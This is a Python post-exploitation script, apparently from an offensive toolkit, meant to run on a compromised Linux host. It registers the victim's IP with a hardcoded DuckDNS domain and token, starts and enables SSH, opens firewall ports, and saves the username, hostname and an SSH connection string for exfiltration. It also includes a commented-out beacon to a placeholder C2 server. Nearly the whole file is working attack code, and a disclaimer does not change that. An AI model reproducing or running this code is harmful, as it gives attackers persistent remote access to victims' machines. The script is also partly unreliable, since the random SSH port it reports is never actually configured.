#!/usr/bin/env python3
"""
POLYGOTTEM - Target DuckDNS Setup Script
=========================================
POST-EXPLOITATION SCRIPT - Deploy this to TARGET after initial compromise

This script runs ON THE COMPROMISED TARGET to:
1. Detect target's public IP
2. Register with DuckDNS (making target accessible via domain)
3. Enable SSH server on target
4. Configure firewall to allow SSH
5. Save connection info for exfiltration

EDUCATIONAL/RESEARCH USE ONLY - AUTHORIZED SECURITY TESTING ONLY

Author: SWORDIntel
Date: 2025-11-15
"""

import os
import sys
import socket
import subprocess
import json
import random
from typing import Optional, Dict
from datetime import datetime

# Embedded DuckDNS credentials (for target registration)
DUCKDNS_DOMAIN = "polygottem.duckdns.org"
DUCKDNS_TOKEN = "62414348-fa36-4a8c-8fc2-8b96ef48b3ea"
DUCKDNS_UPDATE_URL = "https://www.duckdns.org/update"

# Configuration file (saved on target for persistence)
CONFIG_FILE = "/tmp/.polygottem_target_info.json"


def get_public_ip() -> Optional[str]:
    """
    Detect target's public IP address

    Returns:
        Public IP or None if detection fails
    """
    try:
        import requests
        services = [
            "https://api.ipify.org",
            "https://ifconfig.me/ip",
            "https://icanhazip.com"
        ]

        for service in services:
            try:
                response = requests.get(service, timeout=5)
                if response.status_code == 200:
                    return response.text.strip()
            except:
                continue
        return None
    except ImportError:
        # Fallback if requests not available
        try:
            import urllib.request
            with urllib.request.urlopen("https://api.ipify.org", timeout=5) as response:
                return response.read().decode('utf-8').strip()
        except:
            return None


def update_duckdns(ip: str) -> bool:
    """
    Register target's IP with DuckDNS

    Args:
        ip: Target's public IP address

    Returns:
        True if registration successful
    """
    try:
        import requests
        params = {
            'domains': DUCKDNS_DOMAIN.replace('.duckdns.org', ''),
            'token': DUCKDNS_TOKEN,
            'ip': ip
        }

        response = requests.get(DUCKDNS_UPDATE_URL, params=params, timeout=10)

        if response.status_code == 200 and response.text.strip() == 'OK':
            return True
        return False
    except:
        # Fallback using curl if requests unavailable
        try:
            domain = DUCKDNS_DOMAIN.replace('.duckdns.org', '')
            url = f"{DUCKDNS_UPDATE_URL}?domains={domain}&token={DUCKDNS_TOKEN}&ip={ip}"
            result = subprocess.run(['curl', '-s', url], capture_output=True, text=True)
            return 'OK' in result.stdout
        except:
            return False


def generate_random_port() -> int:
    """Generate random SSH port for security"""
    return random.randint(2000, 65000)


def enable_ssh_server(port: int = 22) -> bool:
    """
    Enable and start SSH server on target

    Args:
        port: SSH port to use

    Returns:
        True if SSH is running
    """
    try:
        # Check if SSH already running
        for service in ['ssh', 'sshd']:
            result = subprocess.run(
                ['systemctl', 'is-active', service],
                capture_output=True,
                text=True
            )
            if result.returncode == 0 and result.stdout.strip() == 'active':
                return True

        # Try to start SSH server
        for service in ['ssh', 'sshd']:
            try:
                subprocess.run(
                    ['systemctl', 'start', service],
                    check=True,
                    capture_output=True
                )
                # Enable on boot
                subprocess.run(
                    ['systemctl', 'enable', service],
                    capture_output=True
                )
                return True
            except:
                continue

        return False
    except:
        return False


def configure_firewall(port: int = 22) -> bool:
    """
    Configure firewall to allow SSH connections

    Args:
        port: SSH port to open

    Returns:
        True if successful
    """
    try:
        # Try ufw (Ubuntu/Debian)
        result = subprocess.run(['which', 'ufw'], capture_output=True)
        if result.returncode == 0:
            subprocess.run(['ufw', 'allow', f'{port}/tcp'], capture_output=True)
            subprocess.run(['ufw', '--force', 'enable'], capture_output=True)
            return True

        # Try firewall-cmd (RHEL/Fedora)
        result = subprocess.run(['which', 'firewall-cmd'], capture_output=True)
        if result.returncode == 0:
            if port == 22:
                subprocess.run(
                    ['firewall-cmd', '--add-service=ssh', '--permanent'],
                    capture_output=True
                )
            else:
                subprocess.run(
                    ['firewall-cmd', f'--add-port={port}/tcp', '--permanent'],
                    capture_output=True
                )
            subprocess.run(['firewall-cmd', '--reload'], capture_output=True)
            return True

        # Try iptables (fallback)
        result = subprocess.run(['which', 'iptables'], capture_output=True)
        if result.returncode == 0:
            subprocess.run(
                ['iptables', '-A', 'INPUT', '-p', 'tcp', '--dport', str(port), '-j', 'ACCEPT'],
                capture_output=True
            )
            return True

        return False
    except:
        return False


def get_hostname() -> str:
    """Get target hostname"""
    try:
        return socket.gethostname()
    except:
        return "unknown"


def get_username() -> str:
    """Get current username"""
    try:
        return os.getenv('USER', os.getenv('USERNAME', 'unknown'))
    except:
        return "unknown"


def save_connection_info(info: Dict) -> bool:
    """
    Save connection information to file for exfiltration

    Args:
        info: Connection information dictionary

    Returns:
        True if successful
    """
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(info, f, indent=2)
        # Make file hidden and readable by all (for exfiltration)
        os.chmod(CONFIG_FILE, 0o644)
        return True
    except:
        return False


def send_beacon(info: Dict) -> bool:
    """
    Send connection info back to attacker (implement your C2 here)

    This is a placeholder - implement your preferred method:
    - HTTP POST to C2 server
    - DNS exfiltration
    - Email beacon
    - etc.

    Args:
        info: Connection information

    Returns:
        True if beacon sent successfully
    """
    try:
        # Example: HTTP POST to C2 server
        # import requests
        # response = requests.post('http://your-c2-server.com/beacon', json=info, timeout=5)
        # return response.status_code == 200

        # For now, just save to file
        return save_connection_info(info)
    except:
        return False


def main():
    """Main setup workflow"""
    print("=" * 70)
    print("POLYGOTTEM Target DuckDNS Setup")
    print("=" * 70)
    print()

    # Use random port for security
    ssh_port = generate_random_port()
    print(f"[*] Using SSH port: {ssh_port}")

    # Step 1: Detect public IP
    print("[1/5] Detecting target public IP...")
    public_ip = get_public_ip()
    if not public_ip:
        print("[!] Failed to detect public IP - trying anyway...")
        public_ip = "unknown"
    else:
        print(f"[+] Public IP: {public_ip}")
    print()

    # Step 2: Register with DuckDNS
    print("[2/5] Registering with DuckDNS...")
    if update_duckdns(public_ip):
        print(f"[+] DuckDNS updated: {DUCKDNS_DOMAIN} → {public_ip}")
    else:
        print("[!] DuckDNS update failed (continuing anyway)")
    print()

    # Step 3: Enable SSH server
    print("[3/5] Enabling SSH server...")
    if enable_ssh_server(ssh_port):
        print("[+] SSH server is running")
    else:
        print("[!] Failed to enable SSH server")
    print()

    # Step 4: Configure firewall
    print("[4/5] Configuring firewall...")
    if configure_firewall(ssh_port):
        print(f"[+] Firewall configured (port {ssh_port} open)")
    else:
        print("[!] Firewall configuration failed")
    print()

    # Step 5: Save connection info
    print("[5/5] Saving connection information...")
    connection_info = {
        'domain': DUCKDNS_DOMAIN,
        'public_ip': public_ip,
        'ssh_port': ssh_port,
        'username': get_username(),
        'hostname': get_hostname(),
        'connection_string': f"ssh -p {ssh_port} {get_username()}@{DUCKDNS_DOMAIN}",
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'platform': sys.platform
    }

    if save_connection_info(connection_info):
        print(f"[+] Connection info saved to {CONFIG_FILE}")

    # Send beacon to C2
    if send_beacon(connection_info):
        print("[+] Beacon sent to C2")
    print()

    # Display connection info
    print("=" * 70)
    print("TARGET CONNECTION INFORMATION")
    print("=" * 70)
    print(f"Domain:      {DUCKDNS_DOMAIN}")
    print(f"Public IP:   {public_ip}")
    print(f"SSH Port:    {ssh_port}")
    print(f"Username:    {get_username()}")
    print(f"Hostname:    {get_hostname()}")
    print()
    print(f"Connect with: {connection_info['connection_string']}")
    print()
    print("=" * 70)
    print()

    # Port forwarding instructions (if behind NAT)
    print("IMPORTANT: If target is behind NAT/router, configure port forwarding:")
    print(f"  External Port {ssh_port} → Internal IP:{ssh_port}")
    print()
    print(f"Connection info saved to: {CONFIG_FILE}")
    print("Exfiltrate this file to obtain access credentials")
    print()

    return 0


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)
